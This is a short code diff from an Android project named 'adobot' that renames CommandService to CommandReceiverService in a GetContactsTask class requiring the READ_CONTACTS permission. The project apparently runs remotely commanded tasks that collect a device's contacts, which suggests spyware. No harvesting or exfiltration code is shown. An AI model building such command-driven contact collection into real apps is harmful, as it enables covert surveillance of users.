@@ -8,7 +8,7 @@ import android.provider.ContactsContract;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandService;
+import com.android.adobot.CommandReceiverService;
 import com.android.adobot.CommonParams;
 
 import java.util.HashMap;
@@ -25,7 +25,7 @@ public class GetContactsTask extends BaseTask {
     private CommonParams commonParams;
     private final String[] pers = {Manifest.permission.READ_CONTACTS};
 
-    public GetContactsTask(CommandService c) {
+    public GetContactsTask(CommandReceiverService c) {
         setContext(c);
         this.commonParams = new CommonParams(c);
     }
